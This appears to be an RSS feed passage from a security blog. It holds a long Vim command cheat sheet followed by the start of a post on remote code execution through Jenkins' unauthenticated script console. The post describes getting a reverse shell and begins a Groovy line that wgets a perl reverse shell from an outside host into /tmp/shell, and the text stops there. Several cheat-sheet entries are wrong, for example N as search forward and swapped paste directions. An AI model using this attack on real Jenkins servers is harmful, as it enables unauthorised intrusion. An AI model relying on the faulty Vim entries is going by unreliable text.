&lt;h3 id=&quot;vim-copy-3-lines-of-text&quot;&gt;Vim Copy 3 Lines of Text&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;3yy&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Copy 3 lines of text into unnamed buffer&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-copy-word&quot;&gt;Vim Copy Word&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vi Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;yw&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Copy word under cursor into unnamed buffer&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-copy-3-words&quot;&gt;Vim Copy 3 Words&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;3yw&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Copy 3 words into unnamed buffer&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-paste-commands&quot;&gt;Vim Paste Commands&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;P&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Copy contents of unamed buffer to right of cursor&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;p&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Copy contents of unamed buffer to left of cursor&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;vim-search-commands&quot;&gt;Vim Search Commands&lt;/h2&gt;

&lt;h3 id=&quot;vim-search-forward&quot;&gt;Vim Search forward&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;N&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim search forward in file&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-search-back&quot;&gt;Vim Search Back&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;SHIFT+N&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim search backward in file&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;vim-search-and-replace-commands&quot;&gt;Vim Search and Replace Commands&lt;/h2&gt;

&lt;h3 id=&quot;vim-search-and-replace-first-instance&quot;&gt;Vim Search and Replace First Instance&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:s/find-string/replace-string/&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim search and replace first instance of specified string&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-search-and-replace-on-a-single-line&quot;&gt;Vim Search and Replace on a Single Line&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:s/find-string/replace-string/g&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim search and replace all instances of specified string on current line&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-search-and-replace-entire-file&quot;&gt;Vim Search and Replace Entire File&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:%s/find-string/replace-string/g&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim search and replace all instances of specified string for entire file&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-search-for-part-of-a-word&quot;&gt;Vim Search for part of a Word&lt;/h3&gt;

&lt;p&gt;A fuzzy search allows you to find something that you only know part of, for example if you wanted to find all instances of lines starting with the word “Picard” you would use the following:&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/^Picard&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim search within file words starting with Picard&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-search-for-words-ending-with-string&quot;&gt;Vim Search for words ending with $string&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/worf$&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim search within file for word engine with worf&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-search-for-metacharacters&quot;&gt;Vim Search for Metacharacters&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/\*&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim search within file for metacharacters like, * &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-exact-match-search-only&quot;&gt;Vim Exact Match Search Only&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/star\.&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim exact search only, will return instances of &quot;star only&quot;, not starfleet or star-trek&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-search-for-a-range-of-strings&quot;&gt;Vim Search for a range of Strings&lt;/h3&gt;

&lt;p&gt;Helpful for finding version numbers in text files.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/v2.[1-9]&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim search for a range, this example would return all v2.1-9 instances within the file, e.g. v2.4 v2.7 etc&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-search-for-upper-and-lowercase&quot;&gt;Vim Search for Upper and Lowercase&lt;/h3&gt;

&lt;p&gt;Search for upper and lowercase strings in Vim.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;/ [tT] [hH [eE]&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Vim search upper or lowercase strings, this example would return any instance of the word 'the'. e.g. The, THE, tHE, tHe &lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;advanced-vim-commands&quot;&gt;Advanced Vim commands&lt;/h2&gt;

&lt;h3 id=&quot;vim-view-options&quot;&gt;Vim View Options&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:set all&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Lists all Vim options&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-run-shell-commands&quot;&gt;Vim Run Shell Commands&lt;/h3&gt;

&lt;p&gt;Run shell commands from  Vim.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:! ls -l&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Run shell command from Vim, in this example ls -l is executed&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-joining-lines&quot;&gt;Vim Joining Lines&lt;/h3&gt;

&lt;p&gt;Backspace doesn’t always work…&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;SHIFT+J&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Position the cursor in either line you wish to join, and press &lt;code&gt;SHIFT+J&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-split-windows&quot;&gt;Vim Split Windows&lt;/h3&gt;

&lt;p&gt;Useful for comparing files, to switch between windows press &lt;code&gt;SHIFT+W&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;vim-split-window-horizontally&quot;&gt;Vim Split Window Horizontally&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:split&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Split window Horizontally in Vim&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h4 id=&quot;vim-split-window-virtically&quot;&gt;Vim Split Window Virtically&lt;/h4&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:vsplit&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Split window Virtically in Vim&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-close-all-split-windows&quot;&gt;Vim Close All Split Windows&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:only&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Closes all split windows and focuses on the primary window&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;vim-save-commands&quot;&gt;Vim Save commands&lt;/h2&gt;

&lt;h3 id=&quot;how-to-save-in-vim&quot;&gt;How to Save in Vim&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:w&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Writes the file to disk&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-save-and-exit&quot;&gt;Vim Save and Exit&lt;/h3&gt;

&lt;p&gt;How to save and exit Vim, personally I use &lt;code&gt;:wq&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:wq&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Save and exit Vim&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &amp;lt;/tr&amp;gt;

      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:x&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Exit - Vim will prompt and ask if you wish to save&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &amp;lt;/tr&amp;gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;SHIFT+ZZ&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Another way to Save and Exit Vim&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &amp;lt;/tr&amp;gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;wq!&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Forces save on read only files, and exits&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;    
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;misc-vim-commands&quot;&gt;Misc Vim Commands&lt;/h2&gt;

&lt;h3 id=&quot;vim-undo-command&quot;&gt;Vim Undo Command&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vi Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;U&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Press &lt;code&gt;SHIFT+U&lt;/code&gt; to undo in Vi&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vim-undo-all&quot;&gt;Vim Undo All&lt;/h3&gt;

&lt;p&gt;Vim undo all since last write.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vim Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;:+X+!&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Undo everything since last write&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;vim-show-file-name&quot;&gt;Vim Show File Name&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;SHIFT+G&lt;/code&gt; shows the file name, number of lines and current position.&lt;/p&gt;

&lt;h2 id=&quot;vim-multipliers&quot;&gt;Vim Multipliers&lt;/h2&gt;

&lt;p&gt;Almost every command in Vim can leverage multipliers, typically it’s a case of prefixing the command with a numnber. Example: &lt;code&gt;10W&lt;/code&gt; would move 10 words to the right.&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Jenkins RCE via Unauthenticated API</title>
          <link>https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/</link>
          <pubDate>Tue, 18 Aug 2015 10:08:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>Jenkins</category>
          
          <category>Exploit</category>
          
          <category>RCE</category>
          
          
          <category>Exploit</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/</guid>
          <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#description&quot; id=&quot;markdown-toc-description&quot;&gt;Description:&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tested-versions&quot; id=&quot;markdown-toc-tested-versions&quot;&gt;Tested Versions&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tested-operating-systems&quot; id=&quot;markdown-toc-tested-operating-systems&quot;&gt;Tested Operating Systems&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#instructions&quot; id=&quot;markdown-toc-instructions&quot;&gt;Instructions&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#groovy-script-wget-shell&quot; id=&quot;markdown-toc-groovy-script-wget-shell&quot;&gt;groovy script wget shell&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#groovy-script-execute-shell-command&quot; id=&quot;markdown-toc-groovy-script-execute-shell-command&quot;&gt;groovy script execute shell command&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#execute-the-groovy-scripts-via-scripttext-jenkins-api&quot; id=&quot;markdown-toc-execute-the-groovy-scripts-via-scripttext-jenkins-api&quot;&gt;Execute the Groovy Scripts via scriptText Jenkins API&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#get-shell&quot; id=&quot;markdown-toc-get-shell&quot;&gt;Get Shell&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#more-info-about-jenkins&quot; id=&quot;markdown-toc-more-info-about-jenkins&quot;&gt;More info about Jenkins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#more-resources&quot; id=&quot;markdown-toc-more-resources&quot;&gt;More Resources&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;description&quot;&gt;Description:&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://jenkins-ci.org/&quot;&gt;Jenkins&lt;/a&gt; (continuous intergration server) default install allows for unauthenticated access to the API on the Jenkins Master Server (default behavour). Allowing unauthenticated access to the groovy script console, allowing an attacker to execute shell commands and / or connect back with a reverse shell.&lt;/p&gt;

&lt;div class=&quot;note warning&quot;&gt;
  &lt;h5&gt;DISCLAIMER&lt;/h5&gt;
  &lt;p&gt;Disclaimer, I didn't discover this exploit, it has been discovered before... This vulnerability has been disclosed before to the Jenkins CI developers, who do &lt;b&gt;not consider it a vulnerability&lt;/b&gt;.&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/lTas7UD.gif&quot; alt=&quot;Jenkins RCE API Exploit&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tested-versions&quot;&gt;Tested Versions&lt;/h2&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Software&lt;/th&gt;
      &lt;th&gt;Version&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;Jenkins&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Ver 1.626&lt;/p&gt;
      &lt;/td&gt;
       &lt;/tr&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;Jenkins&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Ver 1.638&lt;/p&gt;
      &lt;/td&gt;
      &lt;/tr&gt;

      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;tested-operating-systems&quot;&gt;Tested Operating Systems&lt;/h2&gt;

&lt;p&gt;An effort to test all affected OS’s, showing the severity of the exploit (e.g. jenkins shell) for the default OS packaged version.&lt;/p&gt;

&lt;div&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Operating System&lt;/th&gt;
      &lt;th&gt;Default Package Expoit&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;CentOS 6 - Jenkins RPM via Jenkins YUM Repo&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;shell as user jenkins&lt;/p&gt;
      &lt;/td&gt;
      &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;instructions&quot;&gt;Instructions&lt;/h2&gt;

&lt;p&gt;This is really basic, I made a few small groovy scripts to execute the shell commands I wanted via Jenkins API (I recall having some issues runing more than one command at a time via groovy), I then executed them using Curl.&lt;/p&gt;

&lt;h3 id=&quot;groovy-script-wget-shell&quot;&gt;groovy script wget shell&lt;/h3&gt;

&lt;p&gt;Script to wget perl reverse shell to target and copy it to /tmp/shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;   &lt;span class=&quot;n&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wget http://192.168.145.128/perl-reverse-shell.pl -O /tmp/shell&quot;&lt;/span&gt;
